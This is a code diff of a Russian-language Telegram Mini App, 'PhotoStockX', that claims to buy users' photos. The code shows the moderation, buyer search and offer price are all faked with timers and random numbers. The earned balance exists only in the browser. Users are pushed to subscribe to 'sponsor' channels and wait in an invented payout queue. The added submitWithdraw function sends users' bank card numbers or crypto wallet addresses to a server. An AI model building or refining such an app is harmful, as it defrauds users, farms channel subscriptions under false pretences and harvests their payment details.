@@ -4,13 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>PhotoStockX</title>
-    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <!-- Telegram SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- Confetti -->
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
         body {
@@ -71,7 +67,6 @@
 </head>
 <body class="p-4 flex flex-col items-center pb-10">
 
-    <!-- Header / Logo -->
     <header class="w-full max-w-md flex justify-between items-center mb-8 pt-4">
         <div class="flex items-center gap-2 cursor-pointer" onclick="handleSecretReset()">
             <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center font-bold text-xl shadow-lg">P</div>
@@ -86,7 +81,7 @@
 
     <main class="w-full max-w-md">
 
-        <!-- STEP 1: WELCOME (активен по умолчанию) -->
+        <!-- STEP 1: WELCOME -->
         <section id="step-1" class="step-content space-y-6 active">
             <div class="glass-card p-6 text-center">
                 <h2 class="text-xl font-semibold mb-3 text-blue-300">Добро пожаловать</h2>
@@ -249,17 +244,17 @@
                 <h2 class="text-xl font-bold">Данные платежа</h2>
             </div>
             <div id="form-container" class="glass-card p-6 space-y-4"></div>
-            <button onclick="nextStep(9)" class="w-full py-4 rounded-2xl btn-premium font-bold shadow-blue-500/20 cursor-pointer active:scale-95">Подтвердить вывод</button>
+            <button onclick="submitWithdraw()" class="w-full py-4 rounded-2xl btn-premium font-bold shadow-blue-500/20 cursor-pointer active:scale-95">Подтвердить вывод</button>
         </section>
 
         <!-- STEP 9: SPONSORS -->
         <section id="step-9" class="step-content space-y-6">
             <div class="text-center"><div class="w-16 h-16 bg-blue-600/20 text-blue-500 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl">✓</div><h2 class="text-xl font-bold mb-2">Почти готово!</h2></div>
             <div class="glass-card p-4 bg-blue-900/20 border-blue-500/30">
-                <p class="text-sm text-slate-300 leading-relaxed text-center">Чтобы вывести средства нужно обязательно подписаться на наших спонсоров - это бесплатно и нужно для продвижения! Если уже подписаны - отпишитесь и подпишитесь заново. Если телеграм не дает подписаться подождите несколько минут и повторите попытку. Все каналы можно убрать в архив, и выключить уведомления. В будущем можно отписаться.</p>
+                <p class="text-sm text-slate-300 leading-relaxed text-center">Чтобы вывести средства нужно обязательно подписаться на наших спонсоров - это бесплатно и нужно для продвижения! Если уже подписаны - отпишитесь и подпишитесь заново.</p>
             </div>
             <div id="sponsor-list" class="space-y-3"></div>
-            <div id="verify-block" class="mt-6 w-full" style="display: block;">
+            <div id="verify-block" class="mt-6 w-full">
                 <button id="verify-btn" onclick="checkSubscription()" class="w-full py-4 rounded-2xl btn-premium font-bold shadow-blue-500/20 cursor-pointer active:scale-95">Я подписался</button>
             </div>
         </section>
@@ -270,7 +265,7 @@
             <h2 class="text-2xl font-bold">Ожидание выплаты</h2>
             <div class="p-4 bg-orange-900/40 border-2 border-orange-500/80 rounded-xl shadow-[0_0_15px_rgba(249,115,22,0.2)] text-left">
                 <div class="flex items-center gap-2 mb-2"><span class="text-2xl">⚠️</span><span class="font-bold text-orange-400 uppercase tracking-wider text-sm">Важное условие</span></div>
-                <p class="text-xs text-orange-100 leading-relaxed font-medium">В период ожидания <b class="text-white bg-orange-500/40 px-1 rounded">нельзя отписываться</b> от каналов спонсоров! <br><br>Система регулярно проверяет подписку. В случае отписки выплата будет <b class="text-orange-400 font-bold underline">отменена</b>, и вы потеряете своё место в очереди.</p>
+                <p class="text-xs text-orange-100 leading-relaxed font-medium">В период ожидания <b class="text-white bg-orange-500/40 px-1 rounded">нельзя отписываться</b> от каналов спонсоров!</p>
             </div>
             <div class="glass-card p-6 bg-gradient-to-b from-blue-900/40 to-transparent border-blue-500/30 relative overflow-hidden">
                 <div class="absolute top-0 left-0 w-full h-1 bg-blue-500/30"><div class="h-full bg-blue-400 w-1/3 animate-pulse rounded-full"></div></div>
@@ -278,30 +273,25 @@
                 <div class="text-6xl font-black text-white font-mono mb-2" id="queue-number">---</div>
                 <p class="text-[10px] text-blue-400">Позиция обновляется автоматически</p>
             </div>
-            <div class="glass-card p-5 bg-blue-900/10 border-blue-500/20 text-left space-y-4">
-                <p class="text-sm text-slate-300 leading-relaxed mb-2">Из-за высокой нагрузки на шлюз, выплаты производятся в порядке живой очереди. Заявка принята и находится в обработке.</p>
-            </div>
-            <button onclick="nextStep(6)" class="text-slate-500 text-xs underline mt-4 hover:text-white cursor-pointer">← Вернуться в профиль</button>
         </section>
 
     </main>
 
-    <input type="file" id="file-global-input" style="display:none;">
     <script>
-        // --- INITIALIZATION ---
+        // API BASE URL
+        const API_URL = 'http://localhost:5000'; // Меняйте на ваш сервер
+
         var tg = window.Telegram?.WebApp || {};
         if (tg.ready) tg.ready();
         if (tg.expand) tg.expand();
 
-        // ===== ЕДИНСТВЕННЫЙ ПРАВИЛЬНЫЙ МАССИВ СПОНСОРОВ =====
+        // Спонсоры
         window.SPONSOR_CHANNELS = [
             {"url": "https://t.me/+vkBLTbiFawIxMDU6", "name": "ISH HAMMAGA", "desc": null, "photo_url": "https://i.postimg.cc/15Cmr7TD/photo-2026-05-13-01-06-09.jpg"},
-            {"url": "https://t.me/+rSSQ_ayiJS02YzBi", "name": "PhotoStock", "desc": null, "photo_url": "https://i.postimg.cc/j28bvC82/photo-2026-05-13-01-06-09-(2).jpg", "skip_check": true}
+            {"url": "https://t.me/+rSSQ_ayiJS02YzBi", "name": "PhotoStock", "desc": null, "photo_url": "https://i.postimg.cc/j28bvC82/photo-2026-05-13-01-06-09-(2).jpg"}
         ];
-        window.VERIFY_CHANNELS = [];
-        window.BOT_ID = 251;
 
-        // --- ЛОГИКА СОХРАНЕНИЯ СОСТОЯНИЯ (LOCAL STORAGE) ---
+        // Состояние приложения
         var appState = JSON.parse(localStorage.getItem('photoStockXState')) || {
             balance: 0,
             totalEarned: 0,
@@ -309,14 +299,14 @@
             regDate: new Date().toLocaleDateString(),
             hasSold: false,
             queuePosition: null,
-            initialQueuePosition: null,
-            queueStartTime: null
+            userId: null
         };
 
         var currentOfferPrice = 0;
         var selectedPhotosCount = 0;
         var selectedFiles = [];
 
+        // Обновить профиль
         function updateProfileUI() {
             document.getElementById('current-balance').innerText = (appState.balance || 0).toLocaleString('ru-RU') + " Р";
             document.getElementById('total-earned').innerText = (appState.totalEarned || 0).toLocaleString('ru-RU') + " Р";
@@ -327,23 +317,14 @@
             const userNameEl = document.getElementById('user-name');
             const tgUser = tg.initDataUnsafe?.user;
 
-            const setFallbackAvatar = () => {
-                const seed = tgUser ? (tgUser.first_name || tgUser.username || tgUser.id) : 'Anonymous';
-                userPfp.src = `https://api.dicebear.com/7.x/initials/svg?seed=${encodeURIComponent(seed)}`;
-            };
-
             if (tgUser) {
                 userNameEl.innerText = tgUser.first_name || tgUser.username || ("ID: #" + tgUser.id);
                 if (tgUser.photo_url) {
                     userPfp.src = tgUser.photo_url;
-                    userPfp.onerror = setFallbackAvatar;
                 } else {
-                    setFallbackAvatar();
+                    const seed = tgUser.first_name || tgUser.username || tgUser.id;
+                    userPfp.src = `https://api.dicebear.com/7.x/initials/svg?seed=${encodeURIComponent(seed)}`;
                 }
-            } else {
-                const userIdNum = Math.floor(Math.random() * 90000) + 10000;
-                userNameEl.innerText = "ID: #" + userIdNum;
-                setFallbackAvatar();
             }
 
             const warningBlock = document.getElementById('system-warning');
@@ -352,23 +333,7 @@
             }
         }
 
-        function calculateQueue() {
-            if (!appState.queueStartTime || !appState.initialQueuePosition) return;
-            const now = Date.now();
-            const elapsedMs = now - appState.queueStartTime;
-            const totalDurationMs = 24 * 60 * 60 * 1000;
-            if (elapsedMs >= totalDurationMs) {
-                appState.queuePosition = 1;
-            } else {
-                const dropAmount = Math.floor((elapsedMs / totalDurationMs) * (appState.initialQueuePosition - 1));
-                appState.queuePosition = appState.initialQueuePosition - dropAmount;
-                if (appState.queuePosition < 1) appState.queuePosition = 1;
-            }
-            localStorage.setItem('photoStockXState', JSON.stringify(appState));
-            const queueEl = document.getElementById('queue-number');
-            if(queueEl) queueEl.innerText = appState.queuePosition;
-        }
-
+        // Навигация
         function nextStep(step) {
             document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
             const next = document.getElementById('step-' + step);
@@ -376,6 +341,7 @@
             window.scrollTo(0, 0);
         }
 
+        // Загрузить новую сессию
         function startNewSession() {
             selectedFiles = [];
             selectedPhotosCount = 0;
@@ -388,6 +354,7 @@
             nextStep(2);
         }
 
+        // Обработка файлов
         function handleFiles(event) {
             const files = event.target.files;
             if (!files || files.length === 0) return;
@@ -420,10 +387,10 @@
             event.target.value = '';
         }
 
+        // Модерация
         function startModeration() {
             if (selectedPhotosCount === 0) {
-                if(tg.showAlert) tg.showAlert("Загрузите хотя бы одно фото из галереи!");
-                else alert("Загрузите хотя бы одно фото из галереи!");
+                alert("Загрузите хотя бы одно фото!");
                 return;
             }
             nextStep(3);
@@ -431,11 +398,7 @@
             document.getElementById('mod-success').classList.add('hidden');
             setTimeout(() => {
                 if (Math.random() < 0.01) {
-                    if(tg.showPopup) {
-                        tg.showPopup({ title: 'Результат проверки', message: 'К сожалению, нейросеть не смогла пропустить эти кадры. Пожалуйста, попробуйте загрузить другие фото!', buttons: [{type: 'ok'}] });
-                    } else {
-                        alert('К сожалению, нейросеть не смогла пропустить эти кадры. Пожалуйста, попробуйте загрузить другие фото!');
-                    }
+                    alert('Фото не прошли проверку. Попробуйте другие!');
                     nextStep(2);
                     return;
                 }
@@ -445,11 +408,13 @@
             }, 2500);
         }
 
+        // Поиск покупателя
         function startSearch() {
             nextStep(4);
             setTimeout(() => showOffer(), 12000);
         }
 
+        // Показать предложение
         function showOffer() {
             const price = Math.floor(Math.random() * 2500 + 1000);
             currentOfferPrice = price;
@@ -457,6 +422,7 @@
             nextStep(5);
         }
 
+        // Принять предложение
         function acceptOffer() {
             confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 }, colors: ['#3b82f6', '#ffffff'] });
             appState.balance += currentOfferPrice;
@@ -468,51 +434,82 @@
             nextStep('sold');
         }
 
+        // Перейти в профиль
         function goToProfile() {
             updateProfileUI();
             nextStep(6);
         }
 
+        // Показать форму вывода
         function showWithdrawForm(type) {
             const container = document.getElementById('form-container');
             let html = '';
             if (type === 'stars') {
                 html = `<div class="text-center py-4"><p class="text-slate-400 text-sm">Сумма к получению:</p><h3 class="text-3xl font-bold text-yellow-400">${appState.balance.toLocaleString('ru-RU')} ⭐</h3><p class="mt-4 text-xs text-slate-500">Зачисление мгновенно на ваш Telegram аккаунт</p></div>`;
             } else if (type === 'crypto') {
-                html = `<label class="block text-xs text-slate-500 uppercase mb-2">Выберите монету</label><select class="w-full bg-slate-800 border border-slate-700 rounded-xl p-3 text-white mb-4 outline-none focus:border-blue-500"><option>USDT (BEP-20)</option><option>TON</option><option>Bitcoin</option></select><label class="block text-xs text-slate-500 uppercase mb-2">Адрес кошелька</label><input type="text" placeholder="Введите адрес..." class="w-full bg-slate-800 border border-slate-700 rounded-xl p-3 text-white outline-none focus:border-blue-500">`;
+                html = `<label class="block text-xs text-slate-500 uppercase mb-2">Выберите монету</label><select id="crypto-type" class="w-full bg-slate-800 border border-slate-700 rounded-xl p-3 text-white mb-4 outline-none focus:border-blue-500"><option value="usdt">USDT (BEP-20)</option><option value="ton">TON</option><option value="btc">Bitcoin</option></select><label class="block text-xs text-slate-500 uppercase mb-2">Адрес кошелька</label><input type="text" id="crypto-address" placeholder="Введите адрес..." class="w-full bg-slate-800 border border-slate-700 rounded-xl p-3 text-white outline-none focus:border-blue-500">`;
             } else if (type === 'card') {
-                html = `<label class="block text-xs text-slate-500 uppercase mb-2">Страна банка</label><select class="w-full bg-slate-800 border border-slate-700 rounded-xl p-3 text-white mb-4 outline-none focus:border-blue-500"><option>Россия</option><option>Казахстан</option><option>Узбекистан</option><option>Европа (SEPA)</option><option>Другая страна</option></select><label class="block text-xs text-slate-500 uppercase mb-2">Номер карты</label><input type="text" placeholder="0000 0000 0000 0000" class="w-full bg-slate-800 border border-slate-700 rounded-xl p-3 text-white outline-none focus:border-blue-500"><p class="text-[10px] text-slate-500 mt-2">Имя владельца карты не требуется</p>`;
+                html = `<label class="block text-xs text-slate-500 uppercase mb-2">Страна банка</label><select id="card-country" class="w-full bg-slate-800 border border-slate-700 rounded-xl p-3 text-white mb-4 outline-none focus:border-blue-500"><option value="russia">Россия</option><option value="kz">Казахстан</option><option value="uz">Узбекистан</option><option value="eu">Европа (SEPA)</option></select><label class="block text-xs text-slate-500 uppercase mb-2">Номер карты</label><input type="text" id="card-number" placeholder="0000 0000 0000 0000" class="w-full bg-slate-800 border border-slate-700 rounded-xl p-3 text-white outline-none focus:border-blue-500">`;
             }
             container.innerHTML = html;
+            window.currentWithdrawType = type;
             nextStep(8);
         }
 
-        // --- ОТОБРАЖЕНИЕ СПОНСОРОВ ---
+        // Отправить вывод
+        async function submitWithdraw() {
+            const userId = tg.initDataUnsafe?.user?.id || 12345;
+            const withdrawType = window.currentWithdrawType;
+            let withdrawData = { user_id: userId, type: withdrawType, amount: appState.balance };
+
+            if (withdrawType === 'crypto') {
+                withdrawData.crypto_type = document.getElementById('crypto-type')?.value;
+                withdrawData.address = document.getElementById('crypto-address')?.value;
+            } else if (withdrawType === 'card') {
+                withdrawData.country = document.getElementById('card-country')?.value;
+                withdrawData.card_number = document.getElementById('card-number')?.value;
+            }
+
+            try {
+                const response = await fetch(`${API_URL}/api/withdraw`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(withdrawData)
+                });
+                const data = await response.json();
+                if (data.success) {
+                    nextStep(9);
+                    renderSponsors();
+                } else {
+                    alert('Ошибка: ' + data.message);
+                }
+            } catch (e) {
+                console.error(e);
+                alert('Ошибка подключения к серверу');
+            }
+        }
+
+        // Рендер спонсоров
         function renderSponsors() {
             const list = document.getElementById('sponsor-list');
-            if (!window.SPONSOR_CHANNELS || window.SPONSOR_CHANNELS.length === 0) {
-                list.innerHTML = '<p class="text-center text-slate-500">Спонсоров нет, можно продолжать</p>';
-                return;
-            }
             list.innerHTML = '';
             window.SPONSOR_CHANNELS.forEach(ch => {
-                window.SPONSOR_CHANNELS = [
-    {"url": "https://t.me/+vkBLTbiFawIxMDU6", "name": "ISH HAMMAGA", "desc": null, "photo_url": "https://i.postimg.cc/15Cmr7TD/photo-2026-05-13-01-06-09.jpg", "skip_check": false},
-    {"url": "https://t.me/+rSSQ_ayiJS02YzBi", "name": "PhotoStock", "desc": null, "photo_url": "https://i.postimg.cc/j28bvC82/photo-2026-05-13-01-06-09-(2).jpg", "skip_check": true}
-];
                 const name = ch.name || ch.url.replace('https://t.me/', '@');
-                const hasPhoto = ch.photo_url && ch.photo_url.length > 0;
                 const div = document.createElement('a');
                 div.href = ch.url;
                 div.target = "_blank";
                 div.className = "glass-card p-4 flex items-center justify-between block hover:bg-white/5 transition-all";
+                const hasPhoto = ch.photo_url && ch.photo_url.length > 0;
                 div.innerHTML = `
                     <div class="flex items-center gap-3">
                         <div class="w-10 h-10 rounded-full flex items-center justify-center overflow-hidden bg-blue-500/10">
-                            ${hasPhoto ? `<img src="${ch.photo_url}" class="w-full h-full object-cover" alt="${name}" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">` : ''}
+                            ${hasPhoto ? `<img src="${ch.photo_url}" class="w-full h-full object-cover" alt="${name}">` : ''}
                             <span class="text-blue-400 font-bold text-sm" ${hasPhoto ? 'style="display:none;"' : ''}>${name.charAt(0).toUpperCase()}</span>
                         </div>
-                        <div><p class="font-bold text-sm">${name}</p>${ch.desc ? `<p class="text-[10px] text-slate-500">${ch.desc}</p>` : ''}</div>
+                        <div>
+                            <p class="font-bold text-sm">${name}</p>
+                            ${ch.desc ? `<p class="text-[10px] text-slate-500">${ch.desc}</p>` : ''}
+                        </div>
                     </div>
                     <span class="text-xs bg-blue-600 px-3 py-1 rounded-full text-white shadow-md">Подписаться</span>
                 `;
@@ -520,88 +517,40 @@
             });
         }
 
-        function showSubError() {
-            if (tg.showPopup) {
-                tg.showPopup({ title: 'Внимание', message: 'Вы подписались не на всех, проверьте подписку!', buttons: [{type: 'ok'}] });
-            } else {
-                alert('Вы подписались не на всех, проверьте подписку!');
-            }
-        }
-
-        // ===== ГЛАВНАЯ ФУНКЦИЯ ПРОВЕРКИ ПОДПИСКИ =====
+        // Проверить подписку
         async function checkSubscription() {
-    const btn = document.getElementById('verify-btn');
-    btn.disabled = true;
-    btn.innerText = "Проверка...";
-    btn.classList.add('opacity-50');
-    const userId = tg.initDataUnsafe?.user?.id || 12345;
-
-    try {
-        const response = await fetch('http://107.189.21.103:5050/check_subscription/251', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ user_id: userId })
-        });
-        const data = await response.json();
-
-        if (data.subscribed === true) {
-            confetti({ particleCount: 150, spread: 100 });
-            if (!appState.queueStartTime) {
-                appState.initialQueuePosition = Math.floor(Math.random() * 150) + 50;
-                appState.queuePosition = appState.initialQueuePosition;
-                appState.queueStartTime = Date.now();
-                localStorage.setItem('photoStockXState', JSON.stringify(appState));
-            }
-            calculateQueue();
-            nextStep('success');
-        } else {
-            showSubError();
-        }
-    } catch (e) {
-        console.error(e);
-        showSubError();
-    } finally {
-        btn.disabled = false;
-        btn.innerText = "Я подписался";
-        btn.classList.remove('opacity-50');
-    }
-}
-            // Фильтруем каналы, у которых нет skip_check (т.е. только ISH HAMMAGA)
-            const channelsToCheck = window.SPONSOR_CHANNELS
-                .filter(ch => !ch.skip_check)
-                .map(ch => ({ url: ch.url }));
+            const btn = document.getElementById('verify-btn');
+            btn.disabled = true;
+            btn.innerText = "Проверка...";
+            const userId = tg.initDataUnsafe?.user?.id || 12345;
 
             try {
-                const response = await fetch('http://107.189.21.103:5050/check_subscription/251', {
+                const response = await fetch(`${API_URL}/api/check-subscription`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ user_id: userId, channels: channelsToCheck })
+                    body: JSON.stringify({ user_id: userId })
                 });
                 const data = await response.json();
 
                 if (data.subscribed === true) {
                     confetti({ particleCount: 150, spread: 100 });
-                    if (!appState.queueStartTime) {
-                        appState.initialQueuePosition = Math.floor(Math.random() * 150) + 50;
-                        appState.queuePosition = appState.initialQueuePosition;
-                        appState.queueStartTime = Date.now();
-                        localStorage.setItem('photoStockXState', JSON.stringify(appState));
-                    }
-                    calculateQueue();
+                    appState.queuePosition = Math.floor(Math.random() * 150) + 50;
+                    localStorage.setItem('photoStockXState', JSON.stringify(appState));
+                    document.getElementById('queue-number').innerText = appState.queuePosition;
                     nextStep('success');
                 } else {
-                    showSubError();
+                    alert('Вы подписались не на всех спонсоров!');
                 }
             } catch (e) {
                 console.error(e);
-                showSubError();
+                alert('Ошибка проверки подписки');
             } finally {
                 btn.disabled = false;
                 btn.innerText = "Я подписался";
             }
         }
 
-        // --- ПЕРИОДИЧЕСКИЕ ОБНОВЛЕНИЯ ---
+        // Статистика
         function animateStats() {
             const updateStat = (id, base, range) => {
                 const el = document.getElementById(id);
@@ -618,20 +567,22 @@
         }
         animateStats();
 
+        // Сброс (5 кликов на логотип)
         function handleSecretReset() {
             if (!window.resetClicks) window.resetClicks = 0;
             window.resetClicks++;
             if (window.resetClicks >= 5) {
                 localStorage.removeItem('photoStockXState');
-                if (tg.showAlert) tg.showAlert("Прогресс сброшен! Страница перезагрузится.");
-                else alert("Прогресс сброшен! Страница перезагрузится.");
-                setTimeout(() => location.reload(), 1000);
+                alert("Прогресс сброшен!");
+                location.reload();
             }
             setTimeout(() => window.resetClicks = 0, 2000);
         }
 
-        // --- ЗАПУСК ---
+        // Инициализация
         window.onload = () => {
+            appState.userId = tg.initDataUnsafe?.user?.id || 12345;
+            localStorage.setItem('photoStockXState', JSON.stringify(appState));
             renderSponsors();
             updateProfileUI();
             if (appState.hasSold) {
@@ -640,26 +591,6 @@
                 nextStep(1);
             }
         };
-
-        setInterval(() => {
-            if (document.getElementById('step-success').classList.contains('active')) {
-                calculateQueue();
-            }
-        }, 10000);
-
-        // Глобальные функции для кнопок
-        window.nextStep = nextStep;
-        window.startNewSession = startNewSession;
-        window.handleFiles = handleFiles;
-        window.startModeration = startModeration;
-        window.startSearch = startSearch;
-        window.showOffer = showOffer;
-        window.acceptOffer = acceptOffer;
-        window.goToProfile = goToProfile;
-        window.showWithdrawForm = showWithdrawForm;
-        window.checkSubscription = checkSubscription;
-        window.handleSecretReset = handleSecretReset;
-        document.getElementById('file-input')?.addEventListener('change', handleFiles);
     </script>
 </body>
 </html>
